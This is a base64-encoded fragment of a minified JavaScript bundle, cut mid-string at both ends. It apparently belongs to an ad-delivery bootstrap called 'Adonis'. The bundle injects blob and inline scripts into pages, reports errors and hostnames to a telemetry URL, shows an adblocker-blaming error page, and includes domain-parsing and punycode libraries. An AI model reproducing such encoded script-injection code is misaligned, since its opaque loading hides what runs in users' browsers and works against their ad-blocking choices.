0LmlubmVySFRNTD1lLGRvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQodCl9dmFyIGE9ZSgxMikubG9nZ2VyO3QuZXhwb3J0cz17aW5zZXJ0QmxvYlNjcmlwdDpyLHRlc3RCbG9iQW5kSW5zZXJ0RmFsbGJhY2s6byxpbnNlcnRJbmxpbmVTY3JpcHQ6aX19LHsxMjoxMn1dLDE1OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO2Z1bmN0aW9uIHIoZSl7dmFyIHQ9bmV3IFhNTEh0dHBSZXF1ZXN0LG49W3MuUkVQT1JUSU5HX1VSTCxlXS5qb2luKCIiKTt0Lm9wZW4oIkdFVCIsbiwhMCksdC5zZW5kKCl9ZnVuY3Rpb24gbyhlKXtzLlJFUE9SVF9FUlJPUlMmJnIoIi9hZG9uaXNfZXJyb3I/ZT0iK2UudG9TdHJpbmcoKSsiJndlYnNpdGU9Iit3aW5kb3cubG9jYXRpb24uaG9zdG5hbWUpfWZ1bmN0aW9uIGkoKXtyZXR1cm4gbnVsbCE9d2luZG93LkFET05JU19CT09UU1RSQVBfU1RBVFM/d2luZG93LkFET05JU19CT09UU1RSQVBfU1RBVFM9PT0hMDpNYXRoLnJhbmRvbSgpPHMuUkVQT1JUSU5HX1JBVEV9ZnVuY3Rpb24gYShlLHQpe2lmKGMoZSksaSgpKXt2YXIgbj17d2Vic2l0ZTp3aW5kb3cubG9jYXRpb24uaG9zdG5hbWUsa2V5OmV9O251bGwhPXQmJihuLnF1YW50aXR5PXQpLHIoWyIvYWRvbmlzX2V2ZW50Lz9ldmVudD0iLEpTT04uc3RyaW5naWZ5KG4pXS5qb2luKCIiKSl9fWZ1bmN0aW9uIGMoZSl7dmFyIHQ9e2tleTplLHRpbWVfbXM6TWF0aC5yb3VuZCh3aW5kb3cucGVyZm9ybWFuY2Uubm93KCkpLHdlYnNpdGU6d2luZG93LmxvY2F0aW9uLmhvc3RuYW1lfTtkLnB1c2godCl9ZnVuY3Rpb24gdSgpe2wuZGVmaW5lUmVhZE9ubHlQcm9wZXJ0eSgiYWRvbmlzQm9vdHN0cmFwVGltaW5nIixkKX12YXIgcz1lKDQpLGw9ZSgxNyksZD1bXTt0LmV4cG9ydHM9e3JlcG9ydEVycm9yOm8scmVwb3J0RXZlbnQ6YSxzYXZlVGltaW5nOnUsc2hvdWxkUmVwb3J0Oml9fSx7MTc6MTcsNDo0fV0sMTY6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlKXt2YXIgdD0vYW5kcm9pZHxpcGhvbmUvZ2ksbj0vQ2hyb21lXC8oXFMpKyBTYWZhcmlcLyhcUykrJC9naSxyPS9cKSBHZWNrb1wvKFxTKSsgRmlyZWZveFwvKFxTKSskL2dpLG89L2xpa2UgR2Vja28uP1wpIFZlcnNpb25cLyhcUykrIFNhZmFyaVwvKFxTKSskL2dpO3JldHVybiBlLnNlYXJjaCh0KT09PS0xJiYoZS5zZWFyY2gobik+LTF8fGUuc2VhcmNoKHIpPi0xfHxlLnNlYXJjaChvKT4tMSl9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG5bImRlZmF1bHQiXT1yfSx7fV0sMTc6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlLHQpe3RyeXtPYmplY3QuZGVmaW5lUHJvcGVydHkod2luZG93LGUse3ZhbHVlOnQsd3JpdGFibGU6ITF9KX1jYXRjaChuKXtvLndhcm4oIkNhbm5vdCBkZWZpbmUgcmVhZC1vbmx5IHByb3BlcnR5IG9mIHdpbmRvdyBvYmplY3Q6ICIrbil9fXZhciBvPWUoMTIpLmxvZ2dlcixpPWZ1bmN0aW9uKGUpeyJsb2FkaW5nIiE9PWRvY3VtZW50LnJlYWR5U3RhdGU/ZSgpOmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoIkRPTUNvbnRlbnRMb2FkZWQiLGUpfTt0LmV4cG9ydHM9e2RlZmluZVJlYWRPbmx5UHJvcGVydHk6cixyZWFkeTppfX0sezEyOjEyfV0sMTg6W2Z1bmN0aW9uKGUsdCxuKXsidXNlIHN0cmljdCI7ZnVuY3Rpb24gcihlKXtyZXR1cm4gZSYmZS5fX2VzTW9kdWxlP2U6eyJkZWZhdWx0IjplfX1mdW5jdGlvbiBvKGUsdCl7aWYoIShlIGluc3RhbmNlb2YgdCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiQ2Fubm90IGNhbGwgYSBjbGFzcyBhcyBhIGZ1bmN0aW9uIil9ZnVuY3Rpb24gaShlLHQpe2lmKCFlKXRocm93IG5ldyBSZWZlcmVuY2VFcnJvcigidGhpcyBoYXNuJ3QgYmVlbiBpbml0aWFsaXNlZCAtIHN1cGVyKCkgaGFzbid0IGJlZW4gY2FsbGVkIik7cmV0dXJuIXR8fCJvYmplY3QiIT10eXBlb2YgdCYmImZ1bmN0aW9uIiE9dHlwZW9mIHQ/ZTp0fWZ1bmN0aW9uIGEoZSx0KXtpZigiZnVuY3Rpb24iIT10eXBlb2YgdCYmbnVsbCE9PXQpdGhyb3cgbmV3IFR5cGVFcnJvcigiU3VwZXIgZXhwcmVzc2lvbiBtdXN0IGVpdGhlciBiZSBudWxsIG9yIGEgZnVuY3Rpb24sIG5vdCAiK3R5cGVvZiB0KTtlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKHQmJnQucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSx0JiYoT2JqZWN0LnNldFByb3RvdHlwZU9mP09iamVjdC5zZXRQcm90b3R5cGVPZihlLHQpOmUuX19wcm90b19fPXQpfWZ1bmN0aW9uIGMoZSl7dmFyIHQ9YXJndW1lbnRzLmxlbmd0aD4xJiZ2b2lkIDAhPT1hcmd1bWVudHNbMV0/YXJndW1lbnRzWzFdOiJHRVQiLG49YXJndW1lbnRzLmxlbmd0aD4yJiZ2b2lkIDAhPT1hcmd1bWVudHNbMl0/YXJndW1lbnRzWzJdOm51bGwscj1hcmd1bWVudHMubGVuZ3RoPjMmJnZvaWQgMCE9PWFyZ3VtZW50c1szXT9hcmd1bWVudHNbM106e307cmV0dXJuIG5ldyB3aW5kb3cuUHJvbWlzZShmdW5jdGlvbihvLGkpe3ZhciBhPW5ldyB3aW5kb3cuWE1MSHR0cFJlcXVlc3Q7YS5vcGVuKHQsZSwhMCk7Zm9yKHZhciBjIGluIHIpe3ZhciB1PXJbY107YS5zZXRSZXF1ZXN0SGVhZGVyKGMsdSl9YS5vbmxvYWQ9ZnVuY3Rpb24oKXthLnN0YXR1cz49NDAwP2kobmV3IGwoYSwiVW5leHBlY3RlZCBzdGF0dXMgY29kZSIpKTpvKGEpfSxhLm9uZXJyb3I9ZnVuY3Rpb24oKXtpKG5ldyBsKGEsIkVycm9yIGVzdGFibGlzaGluZyBjb25uZWN0aW9uIikpfSxhLnNlbmQobil9KX1PYmplY3QuZGVmaW5lUHJvcGVydHkobiwiX19lc01vZHVsZSIse3ZhbHVlOiEwfSksbi5YaHJSZXF1ZXN0RXJyb3I9dm9pZCAwLG4ucmVxdWVzdD1jO3ZhciB1PWUoMTkpLHM9cih1KSxsPW4uWGhyUmVxdWVzdEVycm9yPWZ1bmN0aW9uKGUpe2Z1bmN0aW9uIHQoZSxuKXtvKHRoaXMsdCk7dmFyIHI9aSh0aGlzLCh0Ll9fcHJvdG9fX3x8T2JqZWN0LmdldFByb3RvdHlwZU9mKHQpKS5jYWxsKHRoaXMsbikpO3JldHVybiByLnJlcT1lLHJ9cmV0dXJuIGEodCxlKSx0fShzWyJkZWZhdWx0Il0pfSx7MTk6MTl9XSwxOTpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUsdCl7aWYoIShlIGluc3RhbmNlb2YgdCkpdGhyb3cgbmV3IFR5cGVFcnJvcigiQ2Fubm90IGNhbGwgYSBjbGFzcyBhcyBhIGZ1bmN0aW9uIil9ZnVuY3Rpb24gbyhlLHQpe2lmKCFlKXRocm93IG5ldyBSZWZlcmVuY2VFcnJvcigidGhpcyBoYXNuJ3QgYmVlbiBpbml0aWFsaXNlZCAtIHN1cGVyKCkgaGFzbid0IGJlZW4gY2FsbGVkIik7cmV0dXJuIXR8fCJvYmplY3QiIT10eXBlb2YgdCYmImZ1bmN0aW9uIiE9dHlwZW9mIHQ/ZTp0fWZ1bmN0aW9uIGkoZSx0KXtpZigiZnVuY3Rpb24iIT10eXBlb2YgdCYmbnVsbCE9PXQpdGhyb3cgbmV3IFR5cGVFcnJvcigiU3VwZXIgZXhwcmVzc2lvbiBtdXN0IGVpdGhlciBiZSBudWxsIG9yIGEgZnVuY3Rpb24sIG5vdCAiK3R5cGVvZiB0KTtlLnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKHQmJnQucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSx0JiYoT2JqZWN0LnNldFByb3RvdHlwZU9mP09iamVjdC5zZXRQcm90b3R5cGVPZihlLHQpOmUuX19wcm90b19fPXQpfWZ1bmN0aW9uIGEoZSl7ZnVuY3Rpb24gdCgpe2UuYXBwbHkodGhpcyxhcmd1bWVudHMpfXJldHVybiB0LnByb3RvdHlwZT1PYmplY3QuY3JlYXRlKGUucHJvdG90eXBlLHtjb25zdHJ1Y3Rvcjp7dmFsdWU6ZSxlbnVtZXJhYmxlOiExLHdyaXRhYmxlOiEwLGNvbmZpZ3VyYWJsZTohMH19KSxPYmplY3Quc2V0UHJvdG90eXBlT2Y/T2JqZWN0LnNldFByb3RvdHlwZU9mKHQsZSk6dC5fX3Byb3RvX189ZSx0fU9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJfX2VzTW9kdWxlIix7dmFsdWU6ITB9KTt2YXIgYz1mdW5jdGlvbihlKXtmdW5jdGlvbiB0KCl7dmFyIGU9YXJndW1lbnRzLmxlbmd0aD4wJiZ2b2lkIDAhPT1hcmd1bWVudHNbMF0/YXJndW1lbnRzWzBdOiIiO3IodGhpcyx0KTt2YXIgbj1vKHRoaXMsKHQuX19wcm90b19ffHxPYmplY3QuZ2V0UHJvdG90eXBlT2YodCkpLmNhbGwodGhpcyxlKSk7cmV0dXJuIE9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJtZXNzYWdlIix7Y29uZmlndXJhYmxlOiEwLGVudW1lcmFibGU6ITEsdmFsdWU6ZSx3cml0YWJsZTohMH0pLE9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJuYW1lIix7Y29uZmlndXJhYmxlOiEwLGVudW1lcmFibGU6ITEsdmFsdWU6bi5jb25zdHJ1Y3Rvci5uYW1lLHdyaXRhYmxlOiEwfSksRXJyb3IuaGFzT3duUHJvcGVydHkoImNhcHR1cmVTdGFja1RyYWNlIik/KEVycm9yLmNhcHR1cmVTdGFja1RyYWNlKG4sbi5jb25zdHJ1Y3RvciksbyhuKSk6KE9iamVjdC5kZWZpbmVQcm9wZXJ0eShuLCJzdGFjayIse2NvbmZpZ3VyYWJsZTohMCxlbnVtZXJhYmxlOiExLHZhbHVlOm5ldyBFcnJvcihlKS5zdGFjayx3cml0YWJsZTohMH0pLG4pfXJldHVybiBpKHQsZSksdH0oYShFcnJvcikpO25bImRlZmF1bHQiXT1jLHQuZXhwb3J0cz1uWyJkZWZhdWx0Il19LHt9XSwyMDpbZnVuY3Rpb24oZSx0LG4peyJ1c2Ugc3RyaWN0IjtmdW5jdGlvbiByKGUpe3JldHVybiBlJiZlLl9fZXNNb2R1bGU/ZTp7ImRlZmF1bHQiOmV9fWZ1bmN0aW9uIG8oZSl7cmV0dXJuIGNbImRlZmF1bHQiXS5yZXBsYWNlKCJ7e1RJVExFfX0iLGUudGl0bGUpfWZ1bmN0aW9uIGkoZSl7ZS5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MPW8oZSl9T2JqZWN0LmRlZmluZVByb3BlcnR5KG4sIl9fZXNNb2R1bGUiLHt2YWx1ZTohMH0pLG4uZGlzcGxheU1lc3NhZ2U9byxuLnJlcGxhY2VDb250ZW50PWk7dmFyIGE9ZSgyMSksYz1yKGEpfSx7MjE6MjF9XSwyMTpbZnVuY3Rpb24oZSx0LG4pe3QuZXhwb3J0cz0nPGhlYWQ+XG4gICAgPG1ldGEgY2hhcnNldD0idXRmLTgiPlxuICAgIDxtZXRhIG5hbWU9InZpZXdwb3J0IiBjb250ZW50PSJ3aWR0aD1kZXZpY2Utd2lkdGgsIGluaXRpYWwtc2NhbGU9MS4wLG1heGltdW0tc2NhbGU9MS4wLCB1c2VyLXNjYWxhYmxlPW5vIj5cbiAgICA8dGl0bGU+e3tUSVRMRX19PC90aXRsZT5cbiAgICA8c3R5bGU+XG4gICAgICBodG1sLCBib2R5IHtcbiAgICAgICAgYmFja2dyb3VuZDogI0VGRUZFRjtcbiAgICAgICAgZm9udC1mYW1pbHk6ICJIZWx2ZXRpY2EgTmV1ZSIsIEhlbHZldGljYSwgQXJpYWwsIHNhbnMtc2VyaWY7XG4gICAgICAgIGhlaWdodDogMTAwJVxuICAgICAgfVxuXG4gICAgICAjbWFpbi1jb250ZW50IHtcbiAgICAgICAgaGVpZ2h0OiAxMDAlO1xuICAgICAgfVxuXG4gICAgICAjbWFpbi1jb250ZW50ID4gZGl2ICB7XG4gICAgICAgIG1heC13aWR0aDogODAwcHg7XG4gICAgICAgIG1pbi13aWR0aDogMjAwcHg7XG5cbiAgICAgICAgbWFyZ2luOiAwIGF1dG87XG4gICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTtcbiAgICAgICAgdG9wOiA1MCU7XG4gICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgtNTAlKTtcbiAgICAgIH1cbiAgICA8L3N0eWxlPlxuPC9oZWFkPlxuPGJvZHk+XG5cdFx0PGRpdiBpZD0ibWFpbi1jb250ZW50Ij5cblx0XHRcdFx0PGRpdj5cblx0XHRcdFx0XHRcdDxoMT5Tb21ldGhpbmcgaW50ZXJmZXJlZCB3aXRoIHRoaXMgd2Vic2l0ZSBsb2FkaW5nPC9oMT5cblx0XHRcdFx0XHRcdDxwPlRoaXMgY291bGQgYmUgYSB0ZW1wb3JhcnkgcHJvYmxlbSB3aXRoIHlvdXIgbmV0d29yaywgb3IgZHVlIHRvIHlvdXIgYWRibG9ja2VyPC9wPlxuXHRcdFx0XHRcdFx0PHA+VHJ5OjwvcD5cblx0XHRcdFx0XHRcdDx1bD5cblx0XHRcdFx0XHRcdFx0XHQ8bGk+Q2hlY2sgeW91ciBpbnRlcm5ldCBjb25uZWN0aW9uIGFuZCByZWxvYWQgdGhlIHBhZ2U8L2xpPlxuXHRcdFx0XHRcdFx0XHRcdDxsaT5JZiB5b3UgYXJlIHVzaW5nIGFuIGFkYmxvY2tlciBkaXNhYmxlIGl0IGJ5IGNsaWNraW5nIG9uIHRoZSBhZGJsb2NrIGljb24gaW4geW91ciBicm93c2VyIHRvb2xiYXI8L2xpPlxuXHRcdFx0XHRcdFx0XHRcdDxsaT5JZiB0aGUgcHJvYmxlbSBwZXJzaXN0cywgY29uc2lkZXIgbGVhdmluZyBhIG1lc3NhZ2Ugb24gdGhlIDxhIGhyZWY9Imh0dHBzOi8vZm9ydW1zLmxhbmlrLnVzLyIgdGFyZ2V0PSJfQkxBTksiPmFkYmxvY2sgdXNlciBmb3J1bXM8L2E+XG5cdFx0XHRcdFx0XHRcdFx0PC9saT5cblx0XHRcdFx0XHRcdDwvdWw+XG5cdFx0XHRcdDwvZGl2PlxuXHRcdDwvZGl2PlxuPC9ib2R5PlxuJ30se31dLDIyOltmdW5jdGlvbihlLHQsbil7ZnVuY3Rpb24gcihlKXsicGVyZm9ybWFuY2UiaW4gZXx8KGUucGVyZm9ybWFuY2U9e30pO3ZhciB0PWUucGVyZm9ybWFuY2U7ZS5wZXJmb3JtYW5jZS5ub3c9dC5ub3d8fHQubW96Tm93fHx0Lm1zTm93fHx0Lm9Ob3d8fHQud2Via2l0Tm93fHxEYXRlLm5vd3x8ZnVuY3Rpb24oKXtyZXR1cm4obmV3IERhdGUpLmdldFRpbWUoKX19cihzZWxmKX0se31dLDIzOltmdW5jdGlvbihlLHQsbil7dC5leHBvcnRzPVsiY29tIiwibmV0IiwiZnIiLCJjby51ayIsImRlIiwidHYiLCJ0b2RheSIsIm9yZyIsImluZm8iLCJpZSIsImJhIiwiZ2ciXX0se31dLDI0OltmdW5jdGlvbihlLHQsbil7InVzZSBzdHJpY3QiO3ZhciByPWUoMjUpLG89e307by5ydWxlcz1lKDIzKS5tYXAoZnVuY3Rpb24oZSl7cmV0dXJue3J1bGU6ZSxzdWZmaXg6ZS5yZXBsYWNlKC9eKFwqXC58XCEpLywiIiksd2lsZGNhcmQ6IioiPT09ZS5jaGFyQXQoMCksZXhjZXB0aW9uOiIhIj09PWUuY2hhckF0KDApfX0pLG8uZW5kc1dpdGg9ZnVuY3Rpb24oZSx0KXtyZXR1cm4gZS5pbmRleE9mKHQsZS5sZW5ndGgtdC5sZW5ndGgpIT09LTF9LG8uZmluZFJ1bGU9ZnVuY3Rpb24oZSl7dmFyIHQ9ci50b0FTQ0lJKGUpO3JldHVybiBvLnJ1bGVzLnJlZHVjZShmdW5jdGlvbihlLG4pe3ZhciBpPXIudG9BU0NJSShuLnN1ZmZpeCk7cmV0dXJuIG8uZW5kc1dpdGgodCwiLiIraSl8fHQ9PT1pP246ZX0sbnVsbCl9LG4uZXJyb3JDb2Rlcz17RE9NQUlOX1RPT19TSE9SVDoiRG9tYWluIG5hbWUgdG9vIHNob3J0LiIsRE9NQUlOX1RPT19MT05HOiJEb21haW4gbmFtZSB0b28gbG9uZy4gSXQgc2hvdWxkIGJlIG5vIG1vcmUgdGhhbiAyNTUgY2hhcnMuIixMQUJFTF9TVEFSVFNfV0lUSF9EQVNIOiJEb21haW4gbmFtZSBsYWJlbCBjYW4gbm90IHN0YXJ0IHdpdGggYSBkYXNoLiIsTEFCRUxfRU5EU19XSVRIX0RBU0g6IkRvbWFpbiBuYW1lIGxhYmVsIGNhbiBub3QgZW5kIHdpdGggYSBkYXNoLiIsTEFCRUxfVE9PX0xPTkc6IkRvbWFpbiBuYW1lIGxhYmVsIHNob3VsZCBiZSBhdCBtb3N0IDYzIGNoYXJzIGxvbmcuIixMQUJFTF9UT09fU0hPUlQ6IkRvbWFpbiBuYW1lIGxhYmVsIHNob3VsZCBiZSBhdCBsZWFzdCAxIGNoYXJhY3RlciBsb25nLiIsTEFCRUxfSU5WQUxJRF9DSEFSUzoiRG9tYWluIG5hbWUgbGFiZWwgY2FuIG9ubHkgY29udGFpbiBhbHBoYW51bWVyaWMgY2hhcmFjdGVycyBvciBkYXNoZXMuIn0sby52YWxpZGF0ZT1mdW5jdGlvbihlKXt2YXIgdD1yLnRvQVNDSUkoZSk7aWYodC5sZW5ndGg8MSlyZXR1cm4iRE9NQUlOX1RPT19TSE9SVCI7aWYodC5sZW5ndGg+MjU1KXJldHVybiJET01BSU5fVE9PX0xPTkciO2Zvcih2YXIgbixvPXQuc3BsaXQoIi4iKSxpPTA7aTxvLmxlbmd0aDsrK2kpe2lmKG49b1tpXSwhbi5sZW5ndGgpcmV0dXJuIkxBQkVMX1RPT19TSE9SVCI7aWYobi5sZW5ndGg+NjMpcmV0dXJuIkxBQkVMX1RPT19MT05HIjtpZigiLSI9PT1uLmNoYXJBdCgwKSlyZXR1cm4iTEFCRUxfU1RBUlRTX1dJVEhfREFTSCI7aWYoIi0iPT09bi5jaGFyQXQobi5sZW5ndGgtMSkpcmV0dXJuIkxBQkVMX0VORFNfV0lUSF9EQVNIIjtpZighL15bYS16MC05XC1dKyQvLnRlc3QobikpcmV0dXJuIkxBQkVMX0lOVkFMSURfQ0hBUlMifX0sbi5wYXJzZT1mdW5jdGlvbihlKXtpZigic3RyaW5nIiE9dHlwZW9mIGUpdGhyb3cgbmV3IFR5cGVFcnJvcigiRG9tYWluIG5hbWUgbXVzdCBiZSBhIHN0cmluZy4iKTt2YXIgdD1lLnNsaWNlKDApLnRvTG93ZXJDYXNlKCk7Ii4iPT09dC5jaGFyQXQodC5sZW5ndGgtMSkmJih0PXQuc2xpY2UoMCx0Lmxlbmd0aC0xKSk7dmFyIGk9by52YWxpZGF0ZSh0KTtpZihpKXJldHVybntpbnB1dDplLGVycm9yOnttZXNzYWdlOm4uZXJyb3JDb2Rlc1tpXSxjb2RlOml9fTt2YXIgYT17aW5wdXQ6ZSx0bGQ6bnVsbCxzbGQ6bnVsbCxkb21haW46bnVsbCxzdWJkb21haW46bnVsbCxsaXN0ZWQ6ITF9LGM9dC5zcGxpdCgiLiIpO2lmKCJsb2NhbCI9PT1jW2MubGVuZ3RoLTFdKXJldHVybiBhO3ZhciB1PWZ1bmN0aW9uKCl7cmV0dXJuL3huLS0vLnRlc3QodCk/KGEuZG9tYWluJiYoYS5kb21haW49ci50b0FTQ0lJKGEuZG9tYWluKSksYS5zdWJkb21haW4mJihhLnN1YmRvbWFpbj1yLnRvQVNDSUkoYS5zdWJkb21haW4pKSxhKTphfSxzPW8uZmluZFJ1bGUodCk7aWYoIXMpcmV0dXJuIGMubGVuZ3RoPDI/YTooYS50bGQ9Yy5wb3AoKSxhLnNsZD1jLnBvcCgpLGEuZG9tYWluPVthLnNsZCxhLnRsZF0uam9pbigiLiIpLGMubGVuZ3RoJiYoYS5zdWJkb21haW49Yy5wb3AoKSksdSgpKTthLmxpc3RlZD0hMDt2YXIgbD1zLnN1ZmZpeC5zcGxpdCgiLiIpLGQ9Yy5zbGljZSgwLGMubGVuZ3RoLWwubGVuZ3RoKTtyZXR1cm4gcy5leGNlcHRpb24mJmQucHVzaChsLnNoaWZ0KCkpLGQubGVuZ3RoPyhzLndpbGRjYXJkJiZsLnVuc2hpZnQoZC5wb3AoKSksZC5sZW5ndGg/KGEudGxkPWwuam9pbigiLiIpLGEuc2xkPWQucG9wKCksYS5kb21haW49W2Euc2xkLGEudGxkXS5qb2luKCIuIiksZC5sZW5ndGgmJihhLnN1YmRvbWFpbj1kLmpvaW4oIi4iKSksdSgpKTp1KCkpOnUoKX0sbi5nZXQ9ZnVuY3Rpb24oZSl7cmV0dXJuIGU/bi5wYXJzZShlKS5kb21haW58fG51bGw6bnVsbH0sbi5pc1ZhbGlkPWZ1bmN0aW9uKGUpe3ZhciB0PW4ucGFyc2UoZSk7cmV0dXJuIEJvb2xlYW4odC5kb21haW4mJnQubGlzdGVkKX19LHsyMzoyMywyNToyNX1dLDI1OltmdW5jdGlvbihlLHQsbil7KGZ1bmN0aW9uKGUpeyFmdW5jdGlvbihyKXtmdW5jdGlvbiBvKGUpe3Rocm93IG5ldyBSYW5nZUVycm9yKGpbZV0pfWZ1bmN0aW9uIGkoZSx0KXtmb3IodmFyIG49ZS5sZW5ndGgscj1bXTtuLS07KXJbbl09dChlW25dKTtyZXR1cm4gcn1mdW5jdGlvbiBhKGUsdCl7dmFyIG49ZS5zcGxpdCgiQCIpLHI9IiI7bi5sZW5ndGg+MSYmKHI9blswXSsiQCIsZT1uWzFdKSxlPWUucmVwbGFjZSh4LCIuIik7dmFyIG89ZS5zcGxpdCgiLiIpLGE9aShvLHQpLmpvaW4oIi4iKTtyZXR1cm4gcithfWZ1bmN0aW9uIGMoZSl7Zm9yKHZhciB0LG4scj1bXSxvPTAsaT1lLmxlbmd0aDtvPGk7KXQ9ZS5jaGFyQ29kZUF0KG8rKyksdD49NTUyOTYmJnQ8PTU2MzE5JiZvPGk/KG49ZS5jaGFyQ29kZUF0KG8rKyksNTYzMjA9PSg2NDUxMiZuKT9yLnB1c2goKCgxMDIzJnQpPDwxMCkrKDEwMjMmbikrNjU1MzYpOihyLnB1c2godCksby0tKSk6ci5wdXNoKHQpO3JldHVybiByfWZ1bmN0aW9uIHUoZSl7cmV0dXJuIGkoZSxmdW5jdGlvbihlKXt2YXIgdD0iIjtyZXR1cm4gZT42NTUzNSYmKGUtPTY1NTM2LHQrPUgoZT4+PjEwJjEwMjN8NTUyOTYpLGU9NTYzMjB8MTAyMyZlKSx0Kz1IKGUpfSkuam9pbigiIil9ZnVuY3Rpb24gcyhlKXtyZXR1cm4gZS00ODwxMD9lLTIyOmUtNjU8MjY/ZS02NTplLTk3PDI2P2UtOTc6RX1mdW5jdGlvbiBsKGUsdCl7cmV0dXJuIGUrMjIrNzUqKGU8MjYpLSgoMCE9dCk8PDUpfWZ1bmN0aW9uIGQoZSx0LG4pe3ZhciByPTA7Zm9yKGU9bj9rKGUvUik6ZT4+MSxlKz1rKGUvdCk7ZT5OKk8+PjE7cis9RSllPWsoZS9OKTtyZXR1cm4gayhyKyhOKzEpKmUvKGUrVCkpfWZ1bmN0aW9uIGYoZSl7dmFyIHQsbixyLGksYSxjLGwsZixwLGgsZz1bXSx3PWUubGVuZ3RoLHY9MCxfPUEsYj1DO2ZvcihuPWUubGFzdEluZGV4T2YoUCksbjwwJiYobj0wKSxyPTA7cjxuOysrcillLmNoYXJDb2RlQXQocik+PTEyOCYmbygibm90LWJhc2ljIiksZy5wdXNoKGUuY2hhckNvZGVBdChyKSk7Zm9yKGk9bj4wP24rMTowO2k8dzspe2ZvcihhPXYsYz0xLGw9RTtpPj13JiZvKCJpbnZhbGlkLWlucHV0IiksZj1zKGUuY2hhckNvZGVBdChpKyspKSwoZj49RXx8Zj5rKCh5LXYpL2MpKSYmbygib3ZlcmZsb3ciKSx2Kz1mKmMscD1sPD1iP1M6bD49YitPP086bC1iLCEoZjxwKTtsKz1FKWg9RS1wLGM+ayh5L2gpJiZvKCJvdmVyZmxvdyIpLGMqPWg7dD1nLmxlbmd0aCsxLGI9ZCh2LWEsdCwwPT1hKSxrKHYvdCk+eS1fJiZvKCJvdmVyZmxvdyIpLF8rPWsodi90KSx2JT10LGcuc3BsaWNlKHYrKywwLF8pfXJldHVybiB1KGcpfWZ1bmN0aW9uIHAoZSl7dmFyIHQsbixyLGksYSx1LHMsZixwLGgsZyx3LHYsXyxiLG09W107Zm9yKGU9YyhlKSx3PWUubGVuZ3RoLHQ9QSxuPTAsYT1DLHU9MDt1PHc7Kyt1KWc9ZVt1XSxnPDEyOCYmbS5wdXNoKEgoZykpO2ZvcihyPWk9bS5sZW5ndGgsaSYmbS5wdXNoKFApO3I8dzspe2ZvcihzPXksdT0wO3U8dzsrK3UpZz1lW3VdLGc+PXQmJmc8cyYmKHM9Zyk7Zm9yKHY9cisxLHMtdD5rKCh5LW4pL3YpJiZvKCJvdmVyZmxvdyIpLG4rPShzLXQpKnYsdD1zLHU9MDt1PHc7Kyt1KWlmKGc9ZVt1XSxnPHQmJisrbj55JiZvKCJvdmVyZmxvdyIpLGc9PXQpe2ZvcihmPW4scD1FO2g9cDw9YT9TOnA+PWErTz9POnAtYSwhKGY8aCk7cCs9RSliPWYtaCxfPUUtaCxtLnB1c2goSChsKGgrYiVfLDApKSksZj1rKGIvXyk7bS5wdXNoKEgobChmLDApKSksYT1kKG4sdixyPT1pKSxuPTAsKytyfSsrbiwrK3R9cmV0dXJuIG0uam9pbigiIil9ZnVuY3Rpb24gaChlKXtyZXR1cm4gYShlLGZ1bmN0aW9uKGUpe3JldHVybiBMLnRlc3QoZSk/ZihlLnNsaWNlKDQpLnRvTG93ZXJDYXNlKCkpOmV9KX1mdW5jdGlvbiBnKGUpe3JldHVybiBhKGUsZnVuY3Rpb24oZSl7cmV0dXJuIEkudGVzdChlKT8ieG4tLSIrcChlKTplfSl9dmFyIHc9Im9iamVjdCI9PXR5cGVvZiBuJiZuJiYhbi5ub2RlVHlwZSYmbix2PSJvYmplY3QiPT10eXBlb2YgdCYmdCYmIXQubm9kZVR5cGUmJnQsXz0ib2JqZWN0Ij09dHlwZW9mIGUmJmU7Xy5nbG9iYWwhPT1fJiZfLndpbmRvdyE9PV8mJl8uc2VsZiE9PV98fChyPV8pO3ZhciBiLG0seT0yMTQ3NDgzNjQ3LEU9MzYsUz0xLE89MjYsVD0zOCxSPTcwMCxDPTcyLEE9MTI4LFA9Ii0iLEw9L154bi0tLyxJPS9bXlx4MjAtXHg3RV0vLHg9L1tceDJFXHUzMDAyXHVGRjBFXHVGRjYxXS9nLGo9e292ZXJmbG93OiJPdmVyZmxvdzogaW5wdXQgbmVlZHMgd2lkZXIgaW50ZWdlcnMgdG8gcHJvY2VzcyIsIm5vdC1iYXNpYyI6IklsbGVnYWwgaW5wdXQgPj0gMHg4MCAobm90IGEgYmFzaWMgY29kZSBwb2ludCkiLCJpbnZhbGlkLWlucHV0IjoiSW52YWxpZCBpbnB1dCJ9LE49RS1TLGs9TWF0aC5mbG9vcixIPVN0cmluZy5mcm9tQ2hhckNvZGU7aWYoYj17dmVyc2lvbjoiMS40LjEiLHVjczI6e2RlY29kZTpjLGVuY29kZTp1fSxkZWNvZGU6ZixlbmNvZGU6cCx0b0FTQ0lJOmcsdG9Vbmljb2RlOmh9LCJmdW5jdGlvbiI9PXR5cGVvZiBkZWZpbmUmJiJvYmplY3QiPT10eXBlb2YgZGVmaW5lLmFtZCYmZGVmaW5lLmFtZClkZWZpbmUoInB1bnljb2RlIixmdW5jdGlvbigpe3JldHVybiBifSk7ZWxzZSBpZih3JiZ2KWlmKHQuZXhwb3J0cz09dyl2LmV4cG9ydHM9YjtlbHNlIGZvcihtIGluIGIpYi5oYXNPd25Qcm9wZXJ0eShtKSYmKHdbb